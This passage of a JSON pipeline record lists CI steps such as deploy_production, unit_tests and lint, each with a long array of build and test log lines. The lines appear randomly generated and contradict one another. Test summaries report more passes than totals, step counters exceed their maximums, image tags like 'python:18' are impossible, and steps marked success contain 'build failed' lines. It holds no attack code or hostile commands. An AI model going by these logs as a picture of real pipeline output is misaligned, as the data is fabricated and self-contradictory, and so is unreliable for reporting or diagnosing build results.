          "[12:19:30] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "Already up to date.",
          "Minifying main.js",
          "Artifact downloaded: 45MB",
          "Cache saved successfully",
          "Transforming 422 files...",
          "Already up to date.",
          "Artifact uploaded: dist.zip (20MB)",
          "Switched to branch 'bugfix/task-789'",
          "Using Python 3.9",
          "yarn add: Done in 24.55s",
          "Layer 8/13: COPY command",
          "Cache hit for key-6479",
          "Cache restored successfully (178MB)",
          "npm install: added 158 packages",
          "NODE_ENV=development",
          "OK",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 package completed",
          "Success!",
          "Pushing to registry...",
          "[12:19:30] INFO: Starting build process",
          "npm notice: package.json updated",
          "Done.",
          "Step 18/23: Building",
          "[12:19:30] WARN: Deprecated API usage",
          "[12:19:30] DEBUG: Query executed in 80ms",
          "pip: Collecting jest",
          "Pulling image: python:18",
          "Tests: 302 passed, 257 total",
          "npm install: added 132 packages",
          "Step 16/22: Linting",
          "Environment: staging",
          "\u2713 build completed",
          "[12:19:30] INFO: Starting build process",
          "Switched to branch 'hotfix/task-821'",
          "Cache hit for key-8304",
          "POST /data - 200 (176ms)",
          "Step 16/20: Building",
          "Tests: 146 passed, 356 total",
          "Tests: 152 passed, 120 total",
          "Environment: development",
          "Connecting to acme.corp:443...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-12T12:19:57.714983",
        "finished_at": "2025-12-12T12:20:00.902300",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Creating production build...",
          "[12:19:30] INFO: Connecting to database",
          "[12:19:30] INFO: Cache refreshed",
          "[12:19:30] DEBUG: Memory usage: 1110MB",
          "[12:19:30] WARN: Deprecated API usage",
          "Creating production build...",
          "Cache hit for key-1246",
          "npm notice: created a lockfile",
          "Snapshots: 47 passed, 0 total",
          "Cache hit for key-2736",
          "Cache hit for key-9019",
          "Bundling main.css",
          "Using Python 3.11",
          "Transforming 865 files...",
          "Cache hit for key-6765",
          "[12:19:30] DEBUG: Memory usage: 819MB",
          "  PASS: test_cache_hit (22ms)",
          "Layer 5/10: COPY command",
          "Uploading artifact 'build' (10 files)",
          "[12:19:30] DEBUG: Query executed in 71ms",
          "[12:19:30] WARN: Deprecated API usage",
          "\u2713 test completed",
          "\u2717 build failed with exit code 122",
          "[12:19:30] DEBUG: Loading configuration",
          "[12:19:30] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "FAILED: test_user_create",
          "  PASS: unit/test_cache_hit.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: integration/test_db_connect.spec.js",
          "Already up to date.",
          "pip: Downloading prettier-3.5.tar.gz",
          "Done.",
          "FAILED: test_db_connect",
          "Cache restored successfully (248MB)",
          "Processing...",
          "Generating source maps...",
          "Step 9/18: Running migrations",
          "Building Docker image...",
          "Cache invalidated: node_modules",
          "Compiling components/handler.rs...",
          "pip: Downloading express-3.1.tar.gz",
          "Step 6/19: Testing",
          "WARNING: express has known vulnerabilities",
          "npm notice: package.json updated",
          "Success!",
          "Checking out master branch",
          "Transforming 507 files...",
          "Bundling runtime.js",
          "Minifying main.js",
          "[12:19:30] INFO: Request completed",
          "[12:19:30] DEBUG: Connection pool: 10 active",
          "Connecting to startup.dev:443...",
          "NODE_ENV=production",
          "Already up to date.",
          "Snapshots: 41 passed, 24 total",
          "\u2713 All checks passed",
          "Using Python 3.12",
          "Layer 5/15: COPY command",
          "Using Node.js 20.7.8",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "Step 13/19: Installing dependencies",
          "Step 7/23: Linting",
          "Tests: 166 passed, 313 total",
          "Step 15/17: Deploying",
          "[12:19:30] INFO: Connecting to database",
          "Ready.",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Ready.",
          "Layer 2/9: RUN command",
          "[12:19:30] INFO: Request completed",
          "Compiling components/utils.go...",
          "Step 5/18: Deploying",
          "FAILED: test_db_connect",
          "yarn add: Done in 5.69s",
          "[12:19:30] INFO: Request completed",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "Coverage: 71% statements, 70% branches",
          "Platform: win32-x64",
          "Using Python 3.11",
          "Ready.",
          "POST /data - 201 (488ms)",
          "HEAD is now at 1819067",
          "\u2717 build failed with exit code 98",
          "Step 10/19: Deploying",
          "Compiling lib/service.java...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing jest@4.13.3",
          "\u2717 build failed with exit code 92",
          "WARNING: express has known vulnerabilities",
          "\u2713 All checks passed",
          "GET /status - 204 (63ms)",
          "Fetching submodules...",
          "Processing...",
          "\u2713 Step 'build' succeeded",
          "Compiling utils/index.js...",
          "Checking out main branch",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Step 8/25: Running migrations",
          "npm install: added 317 packages",
          "Step 1/20: Testing",
          "Already up to date.",
          "[12:19:30] INFO: Connecting to database",
          "Generating source maps...",
          "Minifying vendor.js",
          "Cache restored successfully (398MB)",
          "Compiling src/index.js...",
          "npm notice: package.json updated",
          "pip: Downloading prettier-4.9.tar.gz",
          "NODE_ENV=test",
          "Platform: linux-x64",
          "npm install: added 417 packages",
          "Creating production build...",
          "\u2713 package completed",
          "[12:19:30] INFO: Cache refreshed",
          "Already up to date.",
          "[12:19:30] DEBUG: Connection pool: 2 active",
          "Uploading artifact 'coverage' (27 files)",
          "WARNING: webpack has known vulnerabilities",
          "Creating production build...",
          "Optimizing 69 modules...",
          "NODE_ENV=development",
          "[12:19:30] INFO: Request completed",
          "Using Node.js 14.12.0",
          "WARNING: webpack has known vulnerabilities",
          "Creating production build...",
          "Done.",
          "Ran 172 tests in 52s",
          "Compiling lib/app.ts...",
          "Loading...",
          "FAILED: test_cache_hit",
          "[12:19:30] WARN: Deprecated API usage",
          "GET /status - 201 (38ms)",
          "Platform: darwin-arm64",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-12T12:20:00.902300",
        "finished_at": "2025-12-12T12:20:05.683276",
        "log_lines": [
          "=== Step: save_cache ===",
          "\u2713 All checks passed",
          "Using Node.js 16.5.4",
          "Environment: development",
          "\u2713 Task completed in 2246ms",
          "[12:19:30] INFO: Connecting to database",
          "Cache invalidated: node_modules",
          "Step 11/23: Deploying",
          "[12:19:30] INFO: Cache refreshed",
          "Step 15/21: Building",
          "Coverage: 87% statements, 83% branches",
          "Finished.",
          "Environment: test",
          "Using Node.js 14.17.7",
          "Waiting...",
          "[12:19:30] INFO: Starting build process",
          "Step 8/23: Deploying",
          "pip install: Successfully installed react-3.19",
          "Compiling src/service.java...",
          "\u2713 Step 'test' succeeded",
          "[12:19:30] DEBUG: Initializing service",
          "Image pulled successfully",
          "\u2717 build failed with exit code 21",
          "npm notice: package.json updated",
          "HEAD is now at e70e4d1",
          "Test Suites: 42 passed, 6 total",
          "Step 8/23: Running migrations",
          "[12:19:30] INFO: Processing request",
          "[12:19:30] INFO: Cache refreshed",
          "Step 7/22: Running migrations",
          "Building Docker image...",
          "  PASS: test_db_connect (225ms)",
          "[12:19:30] INFO: Processing request",
          "Environment: development",
          "Cache miss for key-2525",
          "Coverage: 100% statements, 79% branches",
          "Image pulled successfully",
          "Step 14/25: Linting",
          "Cache invalidated: node_modules",
          "[12:19:30] INFO: Processing request",
          "Loading...",
          "Tests: 413 passed, 302 total",
          "Ran 47 tests in 14s",
          "Uploading artifact 'dist' (10 files)",
          "HEAD is now at 3c324bd",
          "[12:19:30] DEBUG: Query executed in 19ms",
          "Step 3/15: Building",
          "Checking out develop branch",
          "Artifact downloaded: 35MB",
          "Step 18/22: Testing",
          "Artifact uploaded: dist.zip (81MB)",
          "[12:19:30] INFO: Starting build process",
          "Image pulled successfully",
          "Snapshots: 24 passed, 26 total",
          "Already up to date.",
          "[12:19:30] WARN: Deprecated API usage",
          "Step 13/20: Running migrations",
          "Artifact downloaded: 17MB",
          "npm install: added 495 packages",
          "Success!",
          "Cache hit for key-4093",
          "Switched to branch 'feature/task-217'",
          "Ready.",
          "[12:19:30] WARN: Deprecated API usage",
          "Ready.",
          "pip: Collecting express",
          "Layer 7/10: COPY command",
          "\u2713 lint completed",
          "Generating source maps...",
          "Exception: ValueError",
          "\u2713 All checks passed",
          "Time: 47.37s",
          "Bundling runtime.js",
          "Installing lodash@2.9.4",
          "[12:19:30] WARN: Deprecated API usage",
          "Pulling image: node:3.11",
          "[12:19:30] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 32",
          "Cache miss for key-4147",
          "Checking out develop branch",
          "Compiling utils/utils.go...",
          "Step 10/24: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pulling image: python:18",
          "Uploading artifact 'dist' (17 files)",
          "Layer 7/10: COPY command",
          "Using Python 3.12",
          "OK",
          "Exception: NullPointerException",
          "\u2717 build failed with exit code 56",
          "Image pulled successfully",
          "Step 14/23: Running migrations",
          "[12:19:30] INFO: Connecting to database",
          "Creating production build...",
          "[12:19:30] INFO: Starting build process",
          "Snapshots: 25 passed, 32 total",
          "Layer 1/9: RUN command",
          "Environment: staging",
          "npm install: added 38 packages",
          "[12:19:30] INFO: Starting build process",
          "Step 1/21: Running migrations",
          "[12:19:30] INFO: Request completed",
          "Coverage: 89% statements, 81% branches",
          "npm notice: package.json updated",
          "\u2713 Step 'install' succeeded",
          "Artifact downloaded: 4MB",
          "[12:19:30] WARN: Deprecated API usage",
          "Bundling runtime.css",
          "Cache saved successfully",
          "Cache saved successfully",
          "npm install: resolved 372 packages",
          "Installing prettier@3.19.4",
          "Ran 127 tests in 51s",
          "Fetching submodules...",
          "Compiling utils/service.java...",
          "Processing...",
          "[12:19:30] DEBUG: Initializing service",
          "Connecting to cloud.services:443...",
          "Bundling vendor.js",
          "pip: Collecting eslint",
          "\u2713 Step 'test' succeeded",
          "Done.",
          "npm install: added 303 packages",
          "Artifact downloaded: 28MB",
          "[12:19:30] INFO: Processing request",
          "Already up to date.",
          "Environment: staging",
          "Bundling styles.css",
          "npm install: added 378 packages",
          "[12:19:30] WARN: Deprecated API usage",
          "[12:19:30] WARN: Deprecated API usage",
          "Using Node.js 15.2.7",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_user_create (386ms)",
          "OK",
          "Ready.",
          "Tests: 256 passed, 275 total",
          "Coverage: 100% statements, 75% branches",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-12T12:20:05.683276",
        "finished_at": "2025-12-12T12:20:21.619861",
        "log_lines": [
          "=== Step: integration_tests ===",
          "WARNING: express has known vulnerabilities",
          "npm install: added 490 packages",
          "Installing prettier@3.3.5",
          "Done.",
          "Processing...",
          "Uploading artifact 'build' (44 files)",
          "Creating production build...",
          "npm install: resolved 993 packages",
          "[12:19:30] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Processing...",
          "Pulling image: python:3.11",
          "Ran 185 tests in 41s",
          "Layer 8/8: ENV command",
          "[12:19:30] INFO: Request completed",
          "Connection established",
          "Test Suites: 21 passed, 29 total",
          "Artifact uploaded: dist.zip (80MB)",
          "Ready.",
          "Step 5/21: Linting",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "[12:19:30] INFO: Cache refreshed",
          "Optimizing 81 modules...",
          "Step 7/23: Building",
          "Snapshots: 46 passed, 13 total",
          "Compiling components/index.js...",
          "Loading...",
          "Verifying...",
          "Transforming 881 files...",
          "Connection established",
          "Connection established",
          "Artifact uploaded: dist.zip (51MB)",
          "\u2713 Task completed in 2257ms",
          "Building Docker image...",
          "POST /data - 202 (154ms)",
          "Success!",
          "\u2717 build failed with exit code 70",
          "Compiling components/utils.go...",
          "Done.",
          "Compiling components/index.js...",
          "pip: Downloading jest-4.6.tar.gz",
          "pip install: Successfully installed express-5.2",
          "Layer 2/11: RUN command",
          "\u2713 All checks passed",
          "Bundling main.css",
          "FAILED: test_auth_login",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "Transforming 387 files...",
          "\u2713 lint completed",
          "[12:19:30] WARN: Deprecated API usage",
          "Cache hit for key-7583",
          "Completed.",
          "Step 8/16: Linting",
          "[12:19:30] DEBUG: Memory usage: 1037MB",
          "Image pulled successfully",
          "Cache miss for key-5070",
          "Already up to date.",
          "Platform: win32-x64",
          "pip: Downloading react-3.3.tar.gz",
          "Pulling image: alpine:3.11",
          "Generating source maps...",
          "Minifying main.js",
          "Cache saved successfully",
          "[12:19:30] WARN: Deprecated API usage",
          "[12:19:30] INFO: Cache refreshed",
          "Cache hit for key-2143",
          "pip: Collecting eslint",
          "Layer 6/13: RUN command",
          "Switched to branch 'feature/task-788'",
          "Bundling runtime.css",
          "Time: 70.727s",
          "[12:19:30] INFO: Processing request",
          "\u2713 Step 'checkout' succeeded",
          "Step 6/19: Testing",
          "Platform: win32-x64",
          "Step 20/25: Linting",
          "[12:19:30] DEBUG: Memory usage: 568MB",
          "Image pulled successfully",
          "Loading...",
          "Compiling lib/handler.rs...",
          "Compiling lib/app.ts...",
          "[12:19:30] INFO: Request completed",
          "\u2713 All checks passed",
          "Cache hit for key-5644",
          "[12:19:30] ERROR: Connection failed",
          "Snapshots: 7 passed, 10 total",
          "WARNING: eslint has known vulnerabilities",
          "Transforming 714 files...",
          "Step 15/25: Installing dependencies",
          "Done.",
          "Pulling image: python:latest",
          "Cache invalidated: build",
          "Connection established",
          "Ran 149 tests in 20s",
          "\u2717 build failed with exit code 111",
          "Cache restored successfully (415MB)",
          "Compiling lib/index.js...",
          "[12:19:30] DEBUG: Loading configuration",
          "[12:19:30] DEBUG: Initializing service",
          "Step 6/17: Building",
          "yarn add: Done in 2.3s",
          "TLS handshake completed",
          "Connection established",
          "[12:19:30] DEBUG: Initializing service",
          "Compiling lib/app.ts...",
          "pip: Downloading lodash-5.14.tar.gz",
          "Step 11/23: Installing dependencies",
          "Minifying app.js",
          "Cache miss for key-2102",
          "Step 13/16: Testing",
          "Uploading artifact 'build' (2 files)",
          "Pulling image: python:18",
          "Tests: 75 passed, 411 total",
          "[12:19:30] DEBUG: Query executed in 73ms",
          "npm install: resolved 1061 packages",
          "[12:19:30] INFO: Starting build process",
          "Coverage: 96% statements, 83% branches",
          "[12:19:30] DEBUG: Connection pool: 6 active",
          "NODE_ENV=test",
          "Compiling src/index.js...",
          "yarn add: Done in 21.14s",
          "GET /health - 204 (77ms)",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 Task completed in 1487ms",
          "Artifact downloaded: 36MB",
          "Creating production build...",
          "GET /health - 201 (88ms)",
          "[12:19:30] INFO: Starting build process",
          "Compiling components/index.js...",
          "Image pulled successfully",
          "pip install: Successfully installed react-4.4",
          "Verifying...",
          "Switched to branch 'hotfix/task-569'",
          "Bundling styles.js",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-12T12:20:21.619861",
        "finished_at": "2025-12-12T12:20:45.524739",
        "log_lines": [
          "=== Step: unit_tests ===",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Processing...",
          "\u2713 build completed",
          "pip install: Successfully installed react-1.12",
          "Done.",
          "\u2713 Task completed in 2996ms",
          "Ready.",
          "pip: Downloading prettier-3.11.tar.gz",
          "POST /data - 200 (341ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Done.",
          "Environment: development",
          "Layer 8/13: COPY command",
          "Cache miss for key-1439",
          "Verifying...",
          "Switched to branch 'feature/task-954'",
          "Cache saved successfully",
          "WARNING: eslint has known vulnerabilities",
          "pip: Installing build dependencies...",
          "  PASS: test_cache_hit (333ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: dist.zip (47MB)",
          "Cache hit for key-7062",
          "Step 8/21: Testing",
          "FAILED: test_api_health",
          "Exception: TypeError",
          "Snapshots: 40 passed, 28 total",
          "Verifying...",
          "Step 9/17: Building",
          "\u2717 build failed with exit code 96",
          "Finished.",
          "Cache miss for key-1466",
          "Artifact downloaded: 24MB",
          "Minifying vendor.js",
          "Snapshots: 19 passed, 47 total",
          "Compiling components/service.java...",
          "[12:19:30] ERROR: Connection failed",
          "Connecting to test.io:443...",
          "Cache miss for key-3785",
          "Pushing to registry...",
          "Step 3/16: Linting",
          "Loading...",
          "Cache invalidated: dependencies",
          "[12:19:30] WARN: Deprecated API usage",
          "Creating production build...",
          "Success!",
          "Compiling src/main.py...",
          "[12:19:30] INFO: Starting build process",
          "Waiting...",
          "Step 12/21: Installing dependencies",
          "Compiling src/utils.go...",
          "Generating source maps...",
          "Image pulled successfully",
          "Already up to date.",
          "[12:19:30] INFO: Starting build process",
          "[12:19:30] INFO: Cache refreshed",
          "[12:19:30] INFO: Cache refreshed",
          "FAILED: test_api_health",
          "pip: Downloading express-3.16.tar.gz",
          "Already up to date.",
          "Step 11/19: Deploying",
          "[12:19:30] DEBUG: Connection pool: 1 active",
          "Compiling src/utils.go...",
          "[12:19:30] DEBUG: Memory usage: 240MB",
          "[12:19:30] DEBUG: Connection pool: 14 active",
          "[12:19:30] INFO: Connecting to database",
          "Done.",
          "Pulling image: alpine:18",
          "Using Python 3.10",
          "npm notice: package.json updated",
          "GET /api - 201 (12ms)",
          "Step 10/15: Running migrations",
          "yarn add: Done in 9.60s",
          "Checking out main branch",
          "Environment: production",
          "[12:19:30] ERROR: Connection failed",
          "Cache miss for key-1581",
          "[12:19:30] INFO: Request completed",
          "Compiling src/index.js...",
          "Completed.",
          "npm notice: package.json updated",
          "[12:19:30] INFO: Request completed",
          "Waiting...",
          "[12:19:30] DEBUG: Connection pool: 8 active",
          "Compiling lib/service.java...",
          "Creating production build...",
          "Minifying main.js",
          "npm install: added 438 packages",
          "Cache saved successfully",
          "Step 15/15: Deploying",
          "NODE_ENV=production",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (19MB)",
          "[12:19:30] WARN: Deprecated API usage",
          "Snapshots: 48 passed, 44 total",
          "Step 17/24: Linting",
          "npm notice: package.json updated",
          "Tests: 364 passed, 406 total",
          "Environment: staging",
          "Checking out master branch",
          "Processing...",
          "Using Python 3.12",
          "Building Docker image...",
          "pip: Collecting jest",
          "\u2713 All checks passed",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "Step 17/21: Testing",
          "[12:19:30] INFO: Processing request",
          "[12:19:30] DEBUG: Query executed in 35ms",
          "Compiling utils/app.ts...",
          "Connection established",
          "Minifying app.js",
          "[12:19:30] DEBUG: Initializing service",
          "Cache miss for key-9849",
          "\u2713 Step 'test' succeeded",
          "Checking out main branch",
          "Tests: 282 passed, 486 total",
          "Cache saved successfully",
          "Loading...",
          "Layer 9/13: RUN command",
          "\u2713 All checks passed",
          "[12:19:30] INFO: Connecting to database",
          "Test Suites: 11 passed, 19 total",
          "[12:19:30] DEBUG: Connection pool: 4 active",
          "Finished.",
          "[12:19:30] INFO: Cache refreshed",
          "Platform: linux-x64",
          "[12:19:30] INFO: Request completed",
          "[12:19:30] INFO: Cache refreshed",
          "Fetching submodules...",
          "Finished.",
          "Optimizing 100 modules...",
          "[12:19:30] DEBUG: Memory usage: 1207MB",
          "Step 16/23: Installing dependencies",
          "Optimizing 31 modules...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-12T12:20:45.524739",
        "finished_at": "2025-12-12T12:21:09.429617",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Transforming 577 files...",
          "Connection established",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/service.java...",
          "[12:19:30] DEBUG: Connection pool: 17 active",
          "[12:19:30] DEBUG: Connection pool: 14 active",
          "Exception: TypeError",
          "  PASS: e2e/test_user_create.spec.js",
          "Creating production build...",
          "Success!",
          "Switched to branch 'feature/task-851'",
          "npm notice: created a lockfile",
          "POST /upload - 202 (383ms)",
          "[12:19:30] DEBUG: Loading configuration",
          "Step 7/24: Testing",
          "Using Python 3.12",
          "[12:19:30] INFO: Processing request",
          "[12:19:30] WARN: Deprecated API usage",
          "Image pulled successfully",
          "[12:19:30] DEBUG: Loading configuration",
          "[12:19:30] WARN: Deprecated API usage",
          "Already up to date.",
          "GET /api - 204 (98ms)",
          "Minifying app.js",
          "Layer 4/8: RUN command",
          "Artifact downloaded: 12MB",
          "Time: 16.59s",
          "Tests: 54 passed, 440 total",
          "[12:19:30] DEBUG: Connection pool: 17 active",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:30] DEBUG: Connection pool: 17 active",
          "\u2713 Task completed in 3192ms",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (87MB)",
          "Compiling utils/app.ts...",
          "  PASS: unit/test_db_connect.spec.js",
          "Compiling components/service.java...",
          "Cache hit for key-2105",
          "Step 20/23: Linting",
          "Finished.",
          "Test Suites: 33 passed, 46 total",
          "[12:19:30] INFO: Starting build process",
          "[12:19:30] ERROR: Connection failed",
          "Cache saved successfully",
          "Cache hit for key-2680",
          "[12:19:30] INFO: Cache refreshed",
          "Done.",
          "Exception: NullPointerException",
          "  PASS: integration/test_user_create.spec.js",
          "npm install: resolved 826 packages",
          "Coverage: 72% statements, 80% branches",
          "[12:19:30] DEBUG: Connection pool: 13 active",
          "[12:19:30] INFO: Processing request",
          "Step 8/16: Linting",
          "Cache hit for key-8851",
          "[12:19:30] DEBUG: Initializing service",
          "Compiling utils/main.py...",
          "Ran 120 tests in 33s",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "Creating production build...",
          "Exception: ValueError",
          "Fetching submodules...",
          "Cache hit for key-7408",
          "FAILED: test_cache_hit",
          "[12:19:30] INFO: Processing request",
          "npm notice: package.json updated",
          "Success!",
          "Step 5/16: Installing dependencies",
          "NODE_ENV=test",
          "Coverage: 81% statements, 78% branches",
          "\u2713 test completed",
          "[12:19:30] WARN: Deprecated API usage",
          "Switched to branch 'bugfix/task-996'",
          "Transforming 466 files...",
          "Ran 29 tests in 11s",
          "Snapshots: 17 passed, 9 total",
          "Environment: test",
          "\u2713 Step 'build' succeeded",
          "Layer 6/9: RUN command",
          "[12:19:30] DEBUG: Initializing service",
          "Using Node.js 19.1.8",
          "Transforming 646 files...",
          "Optimizing 39 modules...",
          "Artifact uploaded: dist.zip (65MB)",
          "[12:19:30] INFO: Request completed",
          "Transforming 296 files...",
          "Test Suites: 12 passed, 31 total",
          "\u2713 Task completed in 3187ms",
          "Verifying...",
          "npm install: resolved 459 packages",
          "Checking out develop branch",
          "Cache hit for key-2627",
          "Step 10/20: Deploying",
          "Using Python 3.10",
          "Cache miss for key-3974",
          "Success!",
          "[12:19:30] INFO: Starting build process",
          "[12:19:30] INFO: Cache refreshed",
          "Uploading artifact 'dist' (18 files)",
          "[12:19:30] DEBUG: Loading configuration",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "WARNING: prettier has known vulnerabilities",
          "Already up to date.",
          "\u2717 build failed with exit code 54",
          "Switched to branch 'feature/task-987'",
          "Cache miss for key-6426",
          "Compiling utils/handler.rs...",
          "Cache invalidated: dependencies",
          "Minifying app.js",
          "Generating source maps...",
          "\u2717 build failed with exit code 100",
          "Uploading artifact 'coverage' (43 files)",
          "TLS handshake completed",
          "pip: Collecting axios",
          "[12:19:30] WARN: Deprecated API usage",
          "Test Suites: 8 passed, 22 total",
          "[12:19:30] WARN: Deprecated API usage",
          "Ran 191 tests in 46s",
          "[12:19:30] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "Platform: win32-x64",
          "Minifying app.js",
          "Transforming 938 files...",
          "Image pulled successfully",
          "[12:19:30] INFO: Processing request",
          "\u2713 Step 'install' succeeded",
          "Connecting to startup.dev:443...",
          "NODE_ENV=test",
          "[12:19:30] DEBUG: Query executed in 49ms",
          "[12:19:30] DEBUG: Query executed in 18ms",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-12T12:21:09.429617",
        "finished_at": "2025-12-12T12:21:17.397910",
        "log_lines": [
          "=== Step: type_check ===",
          "pip: Collecting eslint",
          "Transforming 549 files...",
          "Minifying app.js",
          "\u2713 All checks passed",
          "pip install: Successfully installed lodash-1.20",
          "pip: Collecting prettier",
          "Cache miss for key-1482",
          "Compiling lib/service.java...",
          "Coverage: 87% statements, 78% branches",
          "\u2713 Task completed in 1789ms",
          "Coverage: 75% statements, 75% branches",
          "Pushing to registry...",
          "\u2717 build failed with exit code 107",
          "POST /data - 200 (87ms)",
          "[12:19:30] INFO: Request completed",
          "WARNING: eslint has known vulnerabilities",
          "[12:19:30] DEBUG: Query executed in 42ms",
          "Time: 68.614s",
          "npm install: added 290 packages",
          "npm notice: created a lockfile",
          "[12:19:30] INFO: Connecting to database",
          "Time: 15.36s",
          "[12:19:30] DEBUG: Loading configuration",
          "Step 9/25: Deploying",
          "[12:19:30] DEBUG: Query executed in 37ms",
          "Image pulled successfully",
          "Generating source maps...",
          "Bundling styles.js",
          "Artifact uploaded: dist.zip (80MB)",
          "GET /status - 201 (60ms)",
          "Waiting...",
          "[12:19:30] INFO: Cache refreshed",
          "Verifying...",
          "Optimizing 47 modules...",
          "FAILED: test_auth_login",
          "pip: Downloading prettier-1.2.tar.gz",
          "Waiting...",
          "Step 8/22: Testing",
          "Test Suites: 24 passed, 9 total",
          "Minifying main.js",
          "Fetching submodules...",
          "Step 19/17: Building",
          "[12:19:30] DEBUG: Initializing service",
          "Pulling image: python:3.11",
          "Optimizing 93 modules...",
          "\u2713 validate completed",
          "Cache miss for key-9079",
          "NODE_ENV=production",
          "[12:19:30] INFO: Processing request",
          "npm notice: package.json updated",
          "Snapshots: 6 passed, 24 total",
          "Step 10/20: Installing dependencies",
          "pip: Collecting express",
          "Ran 142 tests in 28s",
          "Checking out master branch",
          "WARNING: lodash has known vulnerabilities",
          "FAILED: test_db_connect",
          "Connection established",
          "Waiting...",
          "NODE_ENV=test",
          "Coverage: 86% statements, 99% branches",
          "Generating source maps...",
          "Optimizing 63 modules...",
          "pip install: Successfully installed lodash-1.20",
          "[12:19:30] ERROR: Connection failed",
          "pip: Collecting react",
          "Building Docker image...",
          "Step 17/16: Linting",
          "POST /data - 200 (369ms)",
          "Artifact uploaded: dist.zip (44MB)",
          "  PASS: test_cache_hit (263ms)",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "Processing...",
          "\u2713 All checks passed",
          "[12:19:30] WARN: Deprecated API usage",
          "Coverage: 89% statements, 92% branches",
          "pip: Collecting prettier",
          "Bundling main.css",
          "Cache saved successfully",
          "[12:19:30] DEBUG: Connection pool: 5 active",
          "Finished.",
          "yarn add: Done in 4.72s",
          "\u2713 test completed",
          "Snapshots: 35 passed, 19 total",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Finished.",
          "Bundling runtime.js",
          "Step 6/22: Running migrations",
          "[12:19:30] INFO: Connecting to database",
          "Connecting to test.io:443...",
          "Cache miss for key-6937",
          "Done.",
          "Artifact uploaded: dist.zip (38MB)",
          "Generating source maps...",
          "Fetching submodules...",
          "[12:19:30] WARN: Deprecated API usage",
          "Success!",
          "[12:19:30] INFO: Processing request",
          "Step 9/24: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pushing to registry...",
          "Image pulled successfully",
          "Cache invalidated: build",
          "Cache saved successfully",
          "Minifying main.js",
          "Creating production build...",
          "[12:19:30] DEBUG: Initializing service",
          "WARNING: webpack has known vulnerabilities",
          "Minifying main.js",
          "Using Python 3.12",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Optimizing 89 modules...",
          "GET /health - 204 (42ms)",
          "[12:19:30] INFO: Starting build process",
          "WARNING: jest has known vulnerabilities",
          "OK",
          "Optimizing 18 modules...",
          "HEAD is now at 701536c",
          "Compiling src/main.py...",
          "Layer 2/11: RUN command",
          "Verifying...",
          "TLS handshake completed",
          "npm install: added 457 packages",
          "Cache hit for key-2754",
          "pip: Installing build dependencies...",
          "Step 1/16: Running migrations",
          "[12:19:30] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Creating production build...",
          "GET /status - 200 (60ms)",
          "Test Suites: 44 passed, 46 total",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-12T12:21:17.397910",
        "finished_at": "2025-12-12T12:21:25.366203",
        "log_lines": [
          "=== Step: lint ===",
          "Compiling utils/handler.rs...",
          "Pulling image: python:3.11",
          "pip: Collecting jest",
          "[12:19:30] INFO: Cache refreshed",
          "npm install: resolved 1430 packages",
          "[12:19:30] INFO: Cache refreshed",
          "Cache invalidated: node_modules",
          "Cache miss for key-2845",
          "[12:19:30] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Minifying main.js",
          "Image pulled successfully",
          "Cache invalidated: node_modules",
          "Compiling components/app.ts...",
          "Pulling image: node:latest",
          "Connecting to example.com:443...",
          "yarn add: Done in 21.74s",
          "\u2713 lint completed",
          "Layer 2/15: ENV command",
          "Test Suites: 48 passed, 15 total",
          "Compiling lib/main.py...",
          "Exception: NullPointerException",
          "yarn add: Done in 4.30s",
